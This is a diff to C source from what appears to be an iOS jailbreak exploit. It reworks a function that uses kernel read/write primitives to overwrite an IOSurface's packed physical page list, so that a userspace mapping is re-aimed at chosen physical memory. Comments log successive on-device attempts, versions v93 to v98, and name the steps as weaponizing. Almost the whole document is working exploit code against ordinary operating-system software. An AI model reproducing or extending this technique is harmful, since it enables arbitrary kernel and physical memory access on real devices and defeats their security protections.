@@ -220,12 +220,9 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	// Zero PT writes. One hypothesis per launch (v94b fallback: client
 	// walk via the sr0/sr8/sr30 dump).
 	(void)cacheMode;
-	// v97 mode ladder: seq%3 — 0=legacy, 1=RANGES-ONLY, 2=A5 CONTROL.
-	// Flags stay ORIGINAL (v96: all nibbles incl. control served 0,0 ⇒
-	// type encoding was never the variable; the wire's SOURCE is).
-	int mode = (int)(seq % 3);
-	mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up_mode(0x4000, mode);
-	jb_tr_beacon("KMAP mode=%d", mode);
+	// v98: create 64KB-backed legacy surfaces (4 backing pages = 4 slots
+	// in the kernel's packed page list, one per probe-scan page).
+	mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(0x10000);
 	if (!surfaceMachPort) {
 		jb_tr_beacon("KMAP fail,noport");
 		*uaddr = NULL;
@@ -245,98 +242,104 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		return -1;
 	}
 
-	// v93→v94 ARC NOTE (history): v93's KERNEL-MAPPED RETARGET proved on
-	// device that desc size/ranges/memRef retargets LAND but the warm
-	// client still serves the cached mapping (base1==base0 ×16, §64) —
-	// the cache lives in the per-task IOSurfaceClient. v94 therefore
-	// creates a FRESH surface per window (cold client) and weapons its
-	// own range list before the first GetBaseAddress. History above
-	// (v84/v93 comments) kept for the decode record.
-	// v94: the fresh surface OWNS a 16KB/1024-entry ranges array (that's
-	// how _getSurfacePort_16up builds it — no separate donor alloc needed;
-	// v93's donor runs proved this array + alias write class on device).
-	// Weaponize: overwrite the first entries with the TARGET PA ranges.
-	// - range list: 4 entries {pa+n*0x4000, 0x4000} covering the full
-	//   0x10000 probe scan, written through the array ALIAS (data-page
-	//   heap, SPTM-legal, proven ×3 runs).
-	// - desc.size@0x50 = 0x10000 (v75-proven landing class; fresh surface
-	//   already reports a sane size — this makes it exactly the scan size)
-	//   via one 32B desc window W[0x48,0x68) that also re-asserts
-	//   ranges@0x60 = its own array (paranoia readback).
-	uint64_t arrAlias = phystokv(kvtophys(ranges));
-	if (!arrAlias) {
-		jb_tr_beacon("KMAP fail,arralias");
-		*uaddr = NULL;
-		return -1;
-	}
-	uint64_t arrOff = ranges & 0x3FFFULL;
-	if (arrOff + 4 * 0x10 > 0x4000) {
-		jb_tr_beacon("KMAP fail,slotrange,arrOff=%llx", (unsigned long long)arrOff);
-		*uaddr = NULL;
-		return -1;
-	}
-	// v96: candidate selection per window — NIBBLE-PRESERVING type ladder
-	// (v95 verdict: original flags = 0x110113, low nibble 3 = real type +
-	// 0x110000 required high bits; my bare 0x2/0x4 candidates were wrong
-	// encodings AND stripped the high bits). Keep f20's high bits, flip
-	// ONLY the low nibble across windows (seq % 8); seq%8==3 = control
-	// (original 3). Entries stay PA (physical interpretations win or the
-	// window visibly no-ops with C,first=0,0).
-	uint32_t f20live = kread32(desc + 0x20);
-	uint32_t nib     = (uint32_t)(seq % 8);
-	for (int ei = 0; ei < 4; ei++) {
-		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x0, pa + ei * 0x4000ULL);
-		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x8, 0x4000ULL);
-	}
-	jb_tr_beacon("KMAP ranges4,pa=%llx,nib=%x,e0=%llx,%llx",
-	             (unsigned long long)pa, nib,
-	             (unsigned long long)kread64(arrAlias + arrOff),
-	             (unsigned long long)kread64(arrAlias + arrOff + 8));
+	// v93→v98 ARC NOTE (history): v93 desc retargets land but warm client
+	// serves cache (§64); v94 fresh surface + cold client maps REAL pages
+	// but from the CREATE-time list (C,first=0,0, §66); v95/96 flag ladders
+	// all-0,0 incl. control (§67/§68) — type encoding irrelevant; v97:
+	// ctor mode ladder — ranges-only create REJECTED (AllocSize mandatory),
+	// A5 control mapped (C,first=A5A5…) ⇒ the wire resolves USER-VAs from
+	// the create list and maps the backing; packed page list = its OUTPUT
+	// (§55's VM_PAGE_PACKED discovery). v98 = rewrite THE PACKED LIST.
+	// The list lives in the surface's OWN 16KB ranges array (v89/v93-proven
+	// alias-write class). Encoding learned ON DEVICE:
+	//   wire → base1 aliases backing page 0 → its PA = vtophys(base1)
+	//   sample = list[0] as stored ⇒ f(PA) known for a real sample ⇒
+	//   packed(page) = sample | (page - sample0) bit-accurate for
+	//   same-format addresses (the packed base field carries [47:12]; we
+	//   replicate the observed low garbage and substitute OUR pages' bits
+	//   above the observed page size).
+	{
+		// FIRST: map the untouched surface (wire #1) to learn the packing.
+		IOSurfaceRef ref0 = IOSurfaceLookupFromMachPort(surfaceMachPort);
+		if (!ref0) {
+			jb_tr_beacon("KMAP fail,lookup0");
+			*uaddr = NULL;
+			return -1;
+		}
+		void *base0v = IOSurfaceGetBaseAddress(ref0);
+		if (!base0v) {
+			jb_tr_beacon("KMAP fail,base0v");
+			*uaddr = NULL;
+			return -1;
+		}
+		uint64_t backingPA = vtophys((uint64_t)base0v);
+		jb_tr_beacon("KMAP wire1,base=%llx,pa=%llx",
+		             (unsigned long long)(uintptr_t)base0v,
+		             (unsigned long long)backingPA);
 
-	// v97: flags stay ORIGINAL (v96 verdict: all 8 nibbles including the
-	// pristine control served 0,0 — type encoding was never the variable;
-	// the wire's SOURCE is under test this launch). Use-count cycle kept:
-	// for mode-1 (unwired) surfaces it IS the first wire.
-	uint32_t f20pre = kread32(desc + 0x20);
-	jb_tr_beacon("KMAP flags,orig=%x", f20pre);
+		// Read the surface's packed page list (first 4 slots) via the
+		// array alias — v89/v93-proven window class (16KB data page).
+		uint64_t arrAlias = phystokv(kvtophys(ranges));
+		if (!arrAlias) {
+			jb_tr_beacon("KMAP fail,arralias");
+			*uaddr = NULL;
+			return -1;
+		}
+		uint64_t arrOff = ranges & 0x3FFFULL;
+		if (arrOff + 4 * 8 > 0x4000) {
+			jb_tr_beacon("KMAP fail,slotrange,arrOff=%llx", (unsigned long long)arrOff);
+			*uaddr = NULL;
+			return -1;
+		}
+		uint64_t s0 = kread64(arrAlias + arrOff + 0);
+		uint64_t s1 = kread64(arrAlias + arrOff + 8);
+		uint64_t s2 = kread64(arrAlias + arrOff + 16);
+		jb_tr_beacon("KMAP packed,s0=%llx,s1=%llx,s2=%llx",
+		             (unsigned long long)s0, (unsigned long long)s1,
+		             (unsigned long long)s2);
 
-	// desc.size retarget via W[0x48,0x68) (v93-proven window/offsets).
-	uint8_t winA[0x20];
-	if (kreadbuf(desc + 0x48, winA, sizeof(winA)) != 0) {
-		jb_tr_beacon("KMAP fail,readA,desc=%llx", (unsigned long long)desc);
-		*uaddr = NULL;
-		return -1;
-	}
-	*(uint64_t *)(winA + (0x50 - 0x48)) = 0x10000ULL;   // size = scan size
-	*(uint64_t *)(winA + (0x60 - 0x48)) = ranges;       // re-assert own array
-	if (kwritebuf(desc + 0x48, winA, sizeof(winA)) != 0) {
-		jb_tr_beacon("KMAP fail,writeA,desc=%llx", (unsigned long long)desc);
-		*uaddr = NULL;
-		return -1;
-	}
-	jb_tr_beacon("KMAP desc,rb,r50=%llx,r60=%llx",
-	             (unsigned long long)kread64(desc + 0x50),
-	             (unsigned long long)kread64(desc + 0x60));
+		// Infer the encoder from the real sample: low garbage bits come
+		// from s0 itself; the page-number field is everything above the
+		// observed 16KB page size. Rebuild each target slot as
+		//   (s0 & 0x3FFF) | (PA' >> 14 << 14)  when packing is [47:12]<<14
+		// and FALL BACK to PA-as-is if the sample's PA bits don't match
+		// s0's (unknown format ⇒ beacon loudly, leave PA-encoded — v95
+		// showed that can't fault, it just no-ops).
+		uint64_t p0 = backingPA & ~0x3FFFULL;
+		uint64_t enc;
+		if ((s0 >> 14) == (p0 >> 14)) {
+			enc = 14;   // packed = (PA >> 14) << 14 | (s0 & 0x3FFF)
+		} else if ((s0 >> 12) == (p0 >> 12)) {
+			enc = 12;   // packed = (PA >> 12) << 12 | (s0 & 0xFFF)
+		} else {
+			enc = 0;    // unknown — PA-as-is fallback
+		}
+		jb_tr_beacon("KMAP enc=%d", (int)enc);
+		for (int ei = 0; ei < 4; ei++) {
+			uint64_t targetPA = (pa & ~0x3FFFULL) + ei * 0x4000ULL;
+			uint64_t packed;
+			if (enc == 14)      packed = (targetPA & ~0x3FFFULL) | (s0 & 0x3FFFULL);
+			else if (enc == 12) packed = (targetPA & ~0xFFFULL) | (s0 & 0xFFFULL);
+			else                packed = targetPA;
+			kwrite64(arrAlias + arrOff + 8 * ei, packed);
+		}
+		jb_tr_beacon("KMAP packed4,pa=%llx,w0=%llx,w1=%llx",
+		             (unsigned long long)pa,
+		             (unsigned long long)kread64(arrAlias + arrOff),
+		             (unsigned long long)kread64(arrAlias + arrOff + 8));
 
-	// v95 RE-WIRE part 2: the use-count cycle — the only userspace lever
-	// that re-runs the wire. Drain to 0 (unwire) then bump to 1 (re-wire,
-	// reading OUR entries under typeCand). Lease/unlease semantics.
-	IOSurfaceRef refC = IOSurfaceLookupFromMachPort(surfaceMachPort);
-	if (!refC) {
-		jb_tr_beacon("KMAP fail,uclookup");
-		*uaddr = NULL;
-		return -1;
+		// Re-wire: drain to 0 (unwire) → increment (re-wire reading the
+		// REWRITTEN packed list).
+		uint32_t uc = IOSurfaceGetUseCount(ref0);
+		while (uc > 0) {
+			IOSurfaceDecrementUseCount(ref0);
+			uc = IOSurfaceGetUseCount(ref0);
+		}
+		IOSurfaceIncrementUseCount(ref0);
+		jb_tr_beacon("KMAP uc,cycled=1");
 	}
-	uint32_t uc = IOSurfaceGetUseCount(refC);
-	jb_tr_beacon("KMAP uc,pre=%u", uc);
-	while (uc > 0) {
-		IOSurfaceDecrementUseCount(refC);
-		uc = IOSurfaceGetUseCount(refC);
-	}
-	IOSurfaceIncrementUseCount(refC);
-	jb_tr_beacon("KMAP uc,cycled=%u", IOSurfaceGetUseCount(refC));
 
-	// Send-right kobject field dump (v94b fallback feed, carried over).
+	// Send-right kobject field dump (client-walk fallback feed).
 	jb_tr_beacon("KMAP sr0=%llx,sr8=%llx,sr30=%llx",
 	             (unsigned long long)kread64(surfaceSendRight + 0x0),
 	             (unsigned long long)kread64(surfaceSendRight + 0x8),
@@ -363,6 +366,10 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		*uaddr = NULL;
 		return -1;
 	}
+	// v98 discriminator: TARGET WINDOW CONTENT ⇒ the packed-list rewrite
+	// re-aimed the backing ⇒ base1 IS the probe window ⇒ CHAIN GATE.
+	// 0,0 ⇒ re-wire rebuilt the list from the desc (rewrite raced or
+	// ignored) ⇒ v99 readback-timing fix. A5 pattern ⇒ stale mapping.
 	jb_tr_beacon("KMAP C,first=%llx,%llx",
 	             (unsigned long long)*(volatile uint64_t *)base1,
 	             (unsigned long long)((volatile uint64_t *)base1)[1]);
@@ -399,6 +406,9 @@ static CFNumberRef CFNUM64(uint64_t value) {
 }
 
 static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
+	// v98: create with a 64KB backing so the packed page list has 4 slots
+	// to retarget (one per probe-scan page); the wire maps ALL of them.
+	if (size <= 0x4000) size = 0x10000;
 	return IOSurface_kalloc_getSurfacePort_16up_mode(size, 0);
 }
 
